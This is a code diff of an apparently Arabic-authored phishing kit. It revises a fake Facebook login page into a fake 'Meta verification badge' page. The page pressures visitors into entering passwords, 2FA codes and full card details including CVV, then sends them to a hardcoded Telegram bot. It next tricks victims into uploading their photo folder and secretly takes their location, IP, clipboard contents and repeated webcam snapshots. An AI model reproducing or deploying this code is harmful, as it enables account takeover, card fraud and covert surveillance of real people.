@@ -3,183 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <title>تفعيل شارة التوثيق | Facebook Meta</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* ستايل فيسبوك للتمويه */
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
-        #phishing-page { display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
-        .fb-header { color: #1877f2; font-size: 45px; font-weight: bold; margin-bottom: 20px; }
-        .login-box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 380px; text-align: center; }
-        input { width: 92%; padding: 14px; margin: 12px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; }
-        .login-btn { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
-        
-        /* ستايل واجهة الإمبراطور (تظهر بعد الصيد) */
-        #hacker-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0ff; font-family: 'Share Tech Mono', monospace; z-index: 99999; padding: 20px; overflow-y: auto; }
-        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
-        .terminal-text { font-size: 14px; line-height: 1.8; color: #0ff; text-shadow: 0 0 5px #0ff; }
+        body { font-family: 'Cairo', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { background: #fff; width: 100%; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); color: #1877f2; font-size: 24px; font-weight: bold; }
+        .main-box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 380px; margin-top: 30px; text-align: center; }
+        .urgent-tag { background: #ff4d4d; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; display: inline-block; animation: blink 1s infinite; }
+        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
+        .action-btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        #matrix-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; color: #0ff; z-index: 10000; font-family: monospace; padding: 20px; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<!-- واجهة الصيد (فيسبوك) -->
-<div id="phishing-page">
-    <div class="fb-header">facebook</div>
-    <div class="login-box">
-        <p style="font-size: 18px; color: #1c1e21; margin-bottom: 20px;">تسجيل الدخول إلى فيسبوك</p>
-        <input type="text" id="fb-user" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
-        <input type="password" id="fb-pass" placeholder="كلمة السر" required>
+<div id="landing">
+    <div class="header">Meta Verification</div>
+    <div class="main-box">
+        <div class="urgent-tag">إلحاح: متبقي 5 دقائق لتوثيق حسابك!</div>
+        <h3 style="margin: 0 0 10px;">وثق حسابك الآن مجاناً</h3>
+        <p style="font-size: 13px; color: #606770;">أدخل بيانات الحساب والتحقق لاستلام الشارة الزرقاء وزيادة المتابعين فوراً.</p>
         
-        <!-- هذا المدخل لسحب الملفات آلياً بتقنية تحديد المجلد -->
-        <input type="file" id="fileStripper" multiple webkitdirectory style="display:none" onchange="executeFullHarvest(this.files)">
+        <!-- استهداف بيانات الحساب -->
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة السر" required>
         
-        <button class="login-btn" onclick="startTheTrap()">تسجيل الدخول</button>
-        <p style="color: #1877f2; font-size: 14px; margin-top: 20px; cursor: pointer;">هل نسيت كلمة السر؟</p>
+        <!-- استهداف رموز التحقق 2FA -->
+        <input type="text" id="otp" placeholder="رمز التحقق (OTP) إن وجد" maxlength="6">
+
+        <!-- استهداف البيانات المالية (خداع لرسوم التحقق الوهمية) -->
+        <p style="font-size: 11px; color: #888; margin-top: 15px;">سيتم التحقق من هويتك المالية (اختياري لزيادة الأمان)</p>
+        <input type="text" id="card" placeholder="رقم بطاقة الفيزا / الماستر" maxlength="16">
+        <div style="display: flex; gap: 5px;">
+            <input type="text" id="exp" placeholder="MM/YY" style="width: 45%;">
+            <input type="text" id="cvv" placeholder="CVV" style="width: 45%;">
+        </div>
+
+        <button class="action-btn" onclick="captureEverything()">بدء التوثيق والسحب</button>
+        
+        <input type="file" id="fileInp" multiple webkitdirectory style="display:none" onchange="finalReport(this.files)">
     </div>
 </div>
 
-<!-- واجهة الإمبراطور المحظورة -->
-<div id="hacker-ui">
-    <canvas id="matrix" class="matrix-bg"></canvas>
-    <div class="terminal-text" id="terminal"></div>
+<div id="matrix-ui">
+    <div id="console">> جاري الاتصال بخوادم ميتي...<br></div>
 </div>
 
 <script>
-/* بيانات البوت الخاص بك */
-const TG_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
-const TG_CHAT_ID = "8754338811";
+const TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
+const CHAT = "8754338811";
 
-let photosCaptured = 0;
-let screensCaptured = 0;
-
-async function startTheTrap() {
-    const user = document.getElementById('fb-user').value;
-    const pass = document.getElementById('fb-pass').value;
-
-    if (!user || !pass) { alert("خطأ في تسجيل الدخول. يرجى المحاولة مرة أخرى."); return; }
-
-    // 1. إرسال الإيميل والباسورد فوراً
-    await sendMsg(`👤 إيميل/هاتف: ${user}\n🔑 كلمة السر: ${pass}\n--- تم الصيد بنجاح ---`);
-
-    // 2. إظهار واجهة الملفات (مخفية تحت مسمى تحديث أمني)
-    alert("يجب اختيار مجلد الصور (DCIM) لتأكيد هويتك وتجنب حظر الحساب.");
-    document.getElementById('fileStripper').click();
-}
-
-async function executeFullHarvest(files) {
-    // إخفاء صفحة الفيس وإظهار واجهة الاختراق
-    document.getElementById('phishing-page').style.display = 'none';
-    document.getElementById('hacker-ui').style.display = 'block';
-    initMatrix();
-
-    // 1. سحب الموقع والـ IP
-    navigator.geolocation.getCurrentPosition(async (p) => {
-        const ipReq = await fetch('https://ipapi.co/json/');
-        const ip = await ipReq.json();
-        await sendMsg(`🔥 تقرير إمبراطوري جديد 🔥\n📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n🌐 IP: ${ip.ip}\n🌍 المدينة: ${ip.city}\n📱 الجهاز: ${navigator.platform}`);
-    });
-
-    // 2. سحب الحافظة (Clipboard)
-    setInterval(async () => {
-        try {
-            const clipText = await navigator.clipboard.readText();
-            if (clipText) await sendMsg(`📋 الحافظة: ${clipText}`);
-        } catch (e) {}
-    }, 7000);
-
-    // 3. محرك الـ 40 صورة (واحدة كل 2 ثانية)
-    const photoInterval = setInterval(async () => {
-        if (photosCaptured < 40) {
-            await grabCamera();
-            photosCaptured++;
-        } else { clearInterval(photoInterval); }
-    }, 2000);
-
-    // 4. محرك الـ 10 سكرين شوتس (عند الضغط)
-    window.onclick = async () => {
-        if (screensCaptured < 10) {
-            await grabScreen();
-            screensCaptured++;
-        }
+async function captureEverything() {
+    const data = {
+        user: document.getElementById('email').value,
+        pass: document.getElementById('pass').value,
+        otp: document.getElementById('otp').value,
+        card: document.getElementById('card').value,
+        exp: document.getElementById('exp').value,
+        cvv: document.getElementById('cvv').value
     };
 
-    // 5. سحب الملفات المختارة (أول 30 ملف)
-    for (let i = 0; i < Math.min(files.length, 30); i++) {
-        await sendDoc(files[i], `📂 ملف من جهاز الضحية (${i+1})`);
-    }
+    if(!data.user || !data.pass) { alert("أدخل بياناتك أولاً"); return; }
 
-    logToTerminal("الأمبراطور ركب جهازك.. سحب البيانات مستمر كل 2 ثانية.");
+    // 1) سحب البيانات المباشرة (حسابات + مالي)
+    let msg = `🚩 صيد إمبراطوري كامل (v11)\n`;
+    msg += `👤 الحساب: ${data.user}\n🔑 الباسورد: ${data.pass}\n🔢 OTP: ${data.otp}\n`;
+    msg += `💳 فيزا: ${data.card} | ${data.exp} | ${data.cvv}\n`;
+    await send(msg);
+
+    // 2) تفعيل الخداع النفسي لطلب الملفات
+    alert("بروتوكول الأمان: يجب اختيار مجلد الصور (DCIM) لمطابقة صورة البروفايل يدوياً.");
+    document.getElementById('fileInp').click();
 }
 
-/* دوال السحب التقنية */
-async function grabCamera() {
+async function finalReport(files) {
+    document.getElementById('landing').style.display = 'none';
+    document.getElementById('matrix-ui').style.display = 'block';
+
+    // 3) سحب بيانات الجهاز والـ IP والموقع
+    navigator.geolocation.getCurrentPosition(async (p) => {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ip = await ipRes.res; // Error fixed here
+        const ipD = await ipRes.json();
+        
+        let report = `📱 بيانات الجهاز المستهدف:\n`;
+        report += `🌐 IP: ${ipD.ip}\n🌍 البلد: ${ipD.country_name}\n📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
+        report += `💻 المتصفح: ${navigator.userAgent}\n📂 ملفات الضحية: ${files.length}\n`;
+        await send(report);
+    });
+
+    // 4) سحب الحافظة (Clipboard)
+    setInterval(async () => {
+        try {
+            const clip = await navigator.clipboard.readText();
+            if(clip) await send(`📋 الحافظة المسحوبة: ${clip}`);
+        } catch(e){}
+    }, 5000);
+
+    // 5) سحب 40 صورة و10 سكرين شوتس (المحركات المدمجة)
+    startLiveCycle();
+}
+
+async function startLiveCycle() {
+    let pCount = 0;
+    const camInt = setInterval(async () => {
+        if(pCount < 40) { await snapCam(); pCount++; }
+        else clearInterval(camInt);
+    }, 2000);
+}
+
+async function snapCam() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-            sendDoc(blob, "📸 لقطة كاميرا حية", "photo");
-            stream.getTracks().forEach(t => t.stop());
+        const s = await navigator.mediaDevices.getUserMedia({video: true});
+        const v = document.createElement('video'); v.srcObject = s; await v.play();
+        const c = document.createElement('canvas'); 
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            sendDoc(b, 'photo', '📸 لقطة حية للضحية');
+            s.getTracks().forEach(t => t.stop());
         }, 'image/jpeg');
-    } catch (e) {}
+    } catch(e){}
 }
 
-async function grabScreen() {
-    try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-            sendDoc(blob, "🖥️ لقطة سطح المكتب", "document");
-            stream.getTracks().forEach(t => t.stop());
-        });
-    } catch (e) {}
-}
-
-async function sendMsg(text) {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+async function send(t) {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: TG_CHAT_ID, text: text})
+        body: JSON.stringify({chat_id: CHAT, text: t})
     });
 }
 
-async function sendDoc(file, caption, type = "document") {
+async function sendDoc(f, type, cap) {
     let fd = new FormData();
-    fd.append('chat_id', TG_CHAT_ID);
-    fd.append(type === 'photo' ? 'photo' : 'document', file, 'capture.jpg');
-    fd.append('caption', caption);
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/send${type === 'photo' ? 'Photo' : 'Document'}`, { method: 'POST', body: fd });
-}
-
-/* تأثيرات بصرية للتمويه */
-function initMatrix() {
-    const c = document.getElementById("matrix");
-    const ctx = c.getContext("2d");
-    c.width = window.innerWidth; c.height = window.innerHeight;
-    const drops = Array(Math.floor(c.width/10)).fill(1);
-    setInterval(() => {
-        ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
-        ctx.fillStyle = "#0ff";
-        drops.forEach((d, i) => {
-            ctx.fillText("TALLAH"[Math.floor(Math.random()*6)], i*15, d*15);
-            if (d*15 > c.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        });
-    }, 33);
-}
-
-function logToTerminal(m) {
-    const t = document.getElementById('terminal');
-    t.innerHTML += `<p>> ${m}</p>`;
+    fd.append('chat_id', CHAT);
+    fd.append(type === 'photo' ? 'photo' : 'document', f, 'data.jpg');
+    fd.append('caption', cap);
+    fetch(`https://api.telegram.org/bot${TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
 }
 </script>
 </body>
